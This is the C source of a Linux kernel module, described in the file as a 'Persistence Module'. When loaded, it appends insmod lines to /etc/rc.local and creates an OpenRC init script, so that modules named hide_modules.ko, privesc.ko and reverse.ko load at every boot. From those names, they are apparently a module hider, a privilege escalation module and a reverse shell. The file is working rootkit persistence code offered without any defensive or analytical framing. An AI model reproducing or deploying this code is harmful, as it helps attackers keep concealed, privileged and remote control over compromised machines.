#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Persistence Module with OpenRC Integration");
MODULE_VERSION("0.6");

#define RC_LOCAL_PATH "/etc/rc.local"
#define INIT_SCRIPT_PATH "/etc/init.d/local"
#define RC_LOCAL_HEADER "#!/bin/sh\n\n# rc.local script for custom commands\n"
#define MODULE_INSERT_HIDE "/sbin/insmod /lib/modules/hide_modules.ko\n"
#define MODULE_INSERT_PRIVESC "/sbin/insmod /lib/modules/privesc.ko\n"
#define MODULE_INSERT_REVERSE "/sbin/insmod /lib/modules/reverse.ko\n"
#define INIT_SCRIPT_CONTENT "#!/sbin/openrc-run\n\ndescription=\"Run local rc.local script\"\n\nstart() {\n    if [ -x /etc/rc.local ]; then\n        ebegin \"Running /etc/rc.local\"\n        /etc/rc.local\n        eend $?\n    fi\n}\n"

// Fonction pour écrire dans un fichier
static int write_to_file(const char *path, const char *content, umode_t mode, int append)
{
    struct file *file;
    loff_t pos = 0;
    ssize_t ret;

    file = filp_open(path, append ? O_WRONLY | O_APPEND : O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (IS_ERR(file)) {
        pr_err("persistence: Unable to open %s, error: %ld\n", path, PTR_ERR(file));
        return PTR_ERR(file);
    }

    ret = kernel_write(file, content, strlen(content), &pos);
    if (ret < 0) {
        pr_err("persistence: Failed to write to %s, error: %ld\n", path, ret);
        filp_close(file, NULL);
        return ret;
    }

    filp_close(file, NULL);
    pr_info("persistence: Wrote to %s\n", path);
    return 0;
}

// Vérifier et configurer rc.local
static int setup_rc_local(void)
{
    struct file *file;

    file = filp_open(RC_LOCAL_PATH, O_RDONLY, 0);
    if (IS_ERR(file)) {
        if (PTR_ERR(file) == -ENOENT) {
            pr_info("persistence: %s not found, creating...\n", RC_LOCAL_PATH);
            if (write_to_file(RC_LOCAL_PATH, RC_LOCAL_HEADER, 0755, 0) < 0)
                return -1;
        } else {
            pr_err("persistence: Error opening %s\n", RC_LOCAL_PATH);
            return -1;
        }
    } else {
        filp_close(file, NULL);
    }

    // Ajouter les modules à charger
    if (write_to_file(RC_LOCAL_PATH, MODULE_INSERT_HIDE, 0644, 1) < 0)
        return -1;
    if (write_to_file(RC_LOCAL_PATH, MODULE_INSERT_PRIVESC, 0644, 1) < 0)
        return -1;
    return write_to_file(RC_LOCAL_PATH, MODULE_INSERT_REVERSE, 0644, 1);
}

// Vérifier et configurer le service OpenRC
static int setup_openrc_service(void)
{
    struct file *file;

    file = filp_open(INIT_SCRIPT_PATH, O_RDONLY, 0);
    if (IS_ERR(file)) {
        if (PTR_ERR(file) == -ENOENT) {
            pr_info("persistence: %s not found, creating...\n", INIT_SCRIPT_PATH);
            if (write_to_file(INIT_SCRIPT_PATH, INIT_SCRIPT_CONTENT, 0755, 0) < 0)
                return -1;
        } else {
            pr_err("persistence: Error opening %s\n", INIT_SCRIPT_PATH);
            return -1;
        }
    } else {
        filp_close(file, NULL);
    }

    pr_info("persistence: Run rc-update add local default manually to enable the service.\n");
    return 0;
}

// Initialisation du module
static int __init persistence_init(void)
{
    int ret;

    pr_info("persistence: Module loaded\n");

    ret = setup_rc_local();
    if (ret < 0) {
        pr_err("persistence: Failed to setup rc.local\n");
        return ret;
    }

    ret = setup_openrc_service();
    if (ret < 0) {
        pr_err("persistence: Failed to setup OpenRC service\n");
        return ret;
    }

    return 0;
}

// Nettoyage du module
static void __exit persistence_exit(void)
{
    pr_info("persistence: Module unloaded\n");
}

module_init(persistence_init);
module_exit(persistence_exit);
